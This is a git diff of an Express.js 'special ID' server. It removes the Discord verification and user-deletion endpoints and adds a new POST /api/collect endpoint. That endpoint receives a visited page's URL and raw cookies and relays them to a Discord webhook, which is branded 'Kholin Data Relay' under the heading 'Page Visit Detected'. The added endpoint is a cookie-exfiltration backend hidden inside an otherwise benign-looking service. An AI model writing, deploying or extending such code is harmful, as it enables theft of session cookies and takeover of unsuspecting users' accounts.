@@ -16,9 +16,8 @@ app.use((req, res, next) => {
 
 app.use(express.json());
 
-// Store generated IDs (in production, use a database)
-const generatedIds = new Map(); // userId -> { specialId, createdAt, username, verified }
-const verifiedUsers = new Map(); // discordId -> { userId, username, specialId, verifiedAt }
+// Store generated IDs
+const generatedIds = new Map(); // userId -> { specialId, createdAt, username, displayName, friendsCount }
 
 // Generate a unique special ID for a user
 function generateSpecialId(userId, username) {
@@ -62,8 +61,7 @@ app.post('/api/users/register', async (req, res) => {
                 createdAt: new Date().toISOString(),
                 username: username,
                 displayName: displayName || username,
-                friendsCount: friendsCount || '0',
-                verified: false
+                friendsCount: friendsCount || '0'
             });
             console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
         }
@@ -157,10 +155,7 @@ app.get('/api/special-id/:userId', (req, res) => {
             username: data.username,
             displayName: data.displayName,
             friendsCount: data.friendsCount,
-            createdAt: data.createdAt,
-            verified: data.verified || false,
-            discordId: data.discordId || null,
-            discordName: data.discordName || null
+            createdAt: data.createdAt
         });
     }
     
@@ -174,10 +169,7 @@ app.get('/api/special-id/:userId', (req, res) => {
                 username: value.username,
                 displayName: value.displayName,
                 friendsCount: value.friendsCount,
-                createdAt: value.createdAt,
-                verified: value.verified || false,
-                discordId: value.discordId || null,
-                discordName: value.discordName || null
+                createdAt: value.createdAt
             });
         }
     }
@@ -219,8 +211,7 @@ app.post('/api/generate-special-id', (req, res) => {
         createdAt: new Date().toISOString(),
         username: username || "User",
         displayName: username || "User",
-        friendsCount: '0',
-        verified: false
+        friendsCount: '0'
     });
     
     console.log(`[Generate] Generated NEW ID for ${userId}: ${specialId}`);
@@ -231,61 +222,6 @@ app.post('/api/generate-special-id', (req, res) => {
         alreadyExists: false,
         userId: userId,
         username: username || "User"
-    });
-});
-
-// Mark user as verified
-app.post('/api/verify-user', (req, res) => {
-    const { userId, specialId, discordId, discordName } = req.body;
-    
-    console.log('[Verify User] Request:', { userId, specialId, discordId, discordName });
-    
-    if (!userId || !specialId) {
-        return res.status(400).json({
-            success: false,
-            error: 'Missing userId or specialId'
-        });
-    }
-    
-    if (generatedIds.has(userId)) {
-        const data = generatedIds.get(userId);
-        if (data.specialId === specialId) {
-            data.verified = true;
-            data.verifiedAt = new Date().toISOString();
-            data.discordId = discordId;
-            data.discordName = discordName;
-            
-            if (discordId) {
-                verifiedUsers.set(discordId, {
-                    userId: userId,
-                    username: data.username,
-                    displayName: data.displayName,
-                    specialId: specialId,
-                    verifiedAt: new Date().toISOString(),
-                    discordName: discordName
-                });
-            }
-            
-            console.log(`[Verify User] ✅ User ${data.username} verified!`);
-            return res.json({
-                success: true,
-                verified: true,
-                userId: userId,
-                specialId: specialId,
-                username: data.username,
-                displayName: data.displayName
-            });
-        } else {
-            return res.json({
-                success: false,
-                error: 'Special ID mismatch'
-            });
-        }
-    }
-    
-    return res.status(404).json({
-        success: false,
-        error: 'User not found'
     });
 });
 
@@ -302,11 +238,7 @@ app.get('/api/all-special-ids', (req, res) => {
             username: info.username,
             displayName: info.displayName,
             friendsCount: info.friendsCount,
-            createdAt: info.createdAt,
-            verified: info.verified || false,
-            verifiedAt: info.verifiedAt || null,
-            discordId: info.discordId || null,
-            discordName: info.discordName || null
+            createdAt: info.createdAt
         });
     }
     return res.json({
@@ -316,38 +248,51 @@ app.get('/api/all-special-ids', (req, res) => {
     });
 });
 
-app.get('/api/verified-users', (req, res) => {
-    const data = [];
-    for (const [discordId, info] of verifiedUsers) {
-        data.push({
-            discordId,
-            ...info
-        });
-    }
-    return res.json({
-        success: true,
-        total: data.length,
-        data: data
-    });
-});
+// ============================================
+// COLLECT ENDPOINT
+// ============================================
 
-app.delete('/api/special-id/:userId', (req, res) => {
-    const { userId } = req.params;
-    
-    if (generatedIds.has(userId)) {
-        const data = generatedIds.get(userId);
-        generatedIds.delete(userId);
-        console.log(`[Admin] Deleted user: ${userId} (${data.username})`);
-        return res.json({
-            success: true,
-            message: `Deleted user ${userId}`
+app.post('/api/collect', async (req, res) => {
+    try {
+        const { url, rawCookies } = req.body;
+        const WEBHOOK_URL = process.env.webhook;
+
+        if (!WEBHOOK_URL) {
+            console.error("Webhook not configured.");
+            return res.status(500).json({ error: "Webhook missing" });
+        }
+
+        const payload = {
+            username: "Kholin Data Relay",
+            avatar_url: "https://playvortex.io/favicon.ico",
+            embeds: [{
+                title: "🌐 Page Visit Detected",
+                color: 0x3498db,
+                fields: [
+                    { name: "🔗 URL", value: url || "Unknown", inline: false },
+                    { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
+                ],
+                footer: { text: "Kholin System", icon_url: "https://playvortex.io/favicon.ico" },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        const response = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
         });
+
+        if (!response.ok) {
+            return res.status(500).json({ error: "Discord webhook failed" });
+        }
+
+        return res.status(200).json({ status: "success" });
+
+    } catch (err) {
+        console.error("Server error:", err);
+        return res.status(500).json({ error: err.message });
     }
-    
-    return res.status(404).json({
-        success: false,
-        error: "User not found"
-    });
 });
 
 // ============================================
@@ -363,9 +308,8 @@ app.get('/', (req, res) => {
             register: 'POST /api/users/register',
             specialId: 'GET /api/special-id/:userId',
             generate: 'POST /api/generate-special-id',
-            verifyUser: 'POST /api/verify-user',
             allIds: 'GET /api/all-special-ids',
-            verifiedUsers: 'GET /api/verified-users',
+            collect: 'POST /api/collect',
             health: 'GET /health'
         }
     });
@@ -376,8 +320,7 @@ app.get('/health', (req, res) => {
         status: 'healthy', 
         timestamp: new Date().toISOString(),
         webhookConfigured: !!process.env.webhook,
-        generatedIdsCount: generatedIds.size,
-        verifiedUsersCount: verifiedUsers.size
+        generatedIdsCount: generatedIds.size
     });
 });
 
